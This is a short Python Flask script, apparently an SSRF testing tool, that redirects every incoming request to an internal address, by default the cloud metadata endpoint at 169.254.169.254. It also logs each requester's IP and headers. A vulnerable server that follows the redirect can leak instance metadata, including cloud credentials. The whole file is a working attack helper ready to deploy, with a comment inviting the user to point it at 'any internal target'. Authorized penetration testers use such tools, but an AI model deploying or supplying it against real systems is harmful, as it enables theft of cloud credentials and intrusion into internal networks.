from flask import Flask, redirect, request
import os

app = Flask(__name__)

# Change this to any internal target you want to test
TARGET = os.environ.get("TARGET", "http://169.254.169.254/latest/meta-data/")

@app.route('/')
@app.route('/<path:path>')
def catch_all(path=''):
    # Log every single request
    print(f"[REQUEST] {request.method} {request.url}")
    print(f"  From IP: {request.remote_addr}")
    print(f"  Headers: {dict(request.headers)}")
    print(f"  Redirecting to: {TARGET}")
    
    return redirect(TARGET, code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
